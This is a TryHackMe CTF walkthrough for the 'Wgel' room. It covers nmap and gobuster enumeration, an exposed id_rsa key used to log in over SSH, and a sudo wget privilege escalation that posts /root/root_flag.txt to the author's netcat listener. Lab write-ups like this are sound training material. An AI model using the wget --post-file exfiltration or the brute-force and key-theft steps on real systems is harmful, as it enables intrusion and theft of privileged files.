@@ -1,0 +1,150 @@
+This is a write up for the easy rated room on try hack me called wgel ctf
+
+The IP i got assigned for this room was 10.10.179.92
+
+
+nmap -sV -sS -A 10.10.179.92
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-07 20:17 SAST
+Nmap scan report for 10.10.179.92
+Host is up (0.15s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
+|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
+|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=6/7%OT=22%CT=1%CU=44201%PV=Y%DS=2%DC=T%G=Y%TM=60BE62E9
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=I%TS=A)SEQ(SP=10
+OS:4%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3
+OS:=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=68DF%W2=6
+OS:8DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW
+OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
+OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
+OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
+OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
+OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 110/tcp)
+HOP RTT       ADDRESS
+1   153.98 ms 10.9.0.1
+2   155.52 ms 10.10.179.92
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 47.13 seconds
+
+So a website and a ssh port.                     
+
+When looking through the code we find some interesting stuff
+
+Jessie don't forget to udate the webiste 
+
+
+    Modified from the Debian original for Ubuntu
+    Last updated: 2014-03-19
+    See: https://launchpad.net/bugs/1288690
+ 
+
+gobuster dir -u http://10.10.179.92 -w /usr/share/wordlists/dirb/big.txt -t 50 -x php,txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.179.92
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,txt
+[+] Timeout:                 10s
+===============================================================
+2021/06/07 20:19:12 Starting gobuster in directory enumeration mode
+===============================================================
+/.htpasswd            (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/.htpasswd.php        (Status: 403) [Size: 277]
+/.htaccess.php        (Status: 403) [Size: 277]
+/.htpasswd.txt        (Status: 403) [Size: 277]
+/.htaccess.txt        (Status: 403) [Size: 277]
+Progress: 8715 / 61410 (14.19%)               [ERROR] 2021/06/07 20:19:47 [!] Get "http://10.10.179.92/affsearch590.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+[ERROR] 2021/06/07 20:19:47 [!] Get "http://10.10.179.92/afiliados.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+Progress: 12828 / 61410 (20.89%)              [ERROR] 2021/06/07 20:20:06 [!] Get "http://10.10.179.92/boardroom.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+Progress: 26235 / 61410 (42.72%)              [ERROR] 2021/06/07 20:21:00 [!] Get "http://10.10.179.92/frames": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+[ERROR] 2021/06/07 20:21:00 [!] Get "http://10.10.179.92/fran.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+[ERROR] 2021/06/07 20:21:00 [!] Get "http://10.10.179.92/fr_virgin.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+/server-status        (Status: 403) [Size: 277]
+/sitemap              (Status: 301) [Size: 314] [--> http://10.10.179.92/sitemap/]
+Progress: 52980 / 61410 (86.27%)                                                 [ERROR] 2021/06/07 20:22:56 [!] Get "http://10.10.179.92/soutez.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+[ERROR] 2021/06/07 20:22:56 [!] Get "http://10.10.179.92/soundfiles.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+Progress: 55359 / 61410 (90.15%)                                                 [ERROR] 2021/06/07 20:23:06 [!] Get "http://10.10.179.92/tariffs": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+[ERROR] 2021/06/07 20:23:06 [!] Get "http://10.10.179.92/tars": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+[ERROR] 2021/06/07 20:23:06 [!] Get "http://10.10.179.92/tartarus.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+[ERROR] 2021/06/07 20:23:06 [!] Get "http://10.10.179.92/tarzan.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+                                                                                  
+===============================================================
+2021/06/07 20:23:30 Finished
+===============================================================
+
+
+Sitemap shows us an interesting page talking about UNapp.
+
+First thing I'm going to do is set a medusa scan to run against the name jessie found in the comment for the ssh key.
+
+Running a goBuster scan on the /sitemap directory showed many subdirectories that were interesting
+
+One of them was a .ssh which held an id_rsa file
+	At this point i stopped brute forcing the ssh key to save on computing power.
+
+gobuster dir -u http://10.10.179.92/sitemap -w /usr/share/wordlists/dirb/big.txt -t 50 -x php,txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.179.92/sitemap
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,txt
+[+] Timeout:                 10s
+===============================================================
+2021/06/07 20:39:17 Starting gobuster in directory enumeration mode
+===============================================================
+/.ssh                 (Status: 301) [Size: 319] [--> http://10.10.179.92/sitemap/.ssh/]
+
+
+using id_rsa and the username we found earlier in the comment in the code we get access to the box.
+
+So i found the user flag but I can't unzip it because i don't have the permissions but a quick sudo -l showed me:
+
+jessie@CorpOne:/usr/share/doc/fontconfig$ sudo -l
+Matching Defaults entries for jessie on CorpOne:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jessie may run the following commands on CorpOne:
+    (ALL : ALL) ALL
+    (root) NOPASSWD: /usr/bin/wget
+
+So small issue. the file i was trying to unzip wasn't the user flag it was in the documents folder adn was easy to read using cat
+
+sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.9.6.25:9001
+--2021-06-07 22:06:52--  http://10.9.6.25:9001/
+Connecting to 10.9.6.25:9001... connected.
+HTTP request sent, awaiting response... No data received.
+
+Using the command above send the root flag onto a nc connection i set up to listen on port 9001
+
+That was a really fun box that i enjoyed to get through. The priv esc was a bit annoying to find the right command but i got it in the end at rooted the box
+
+GLHF
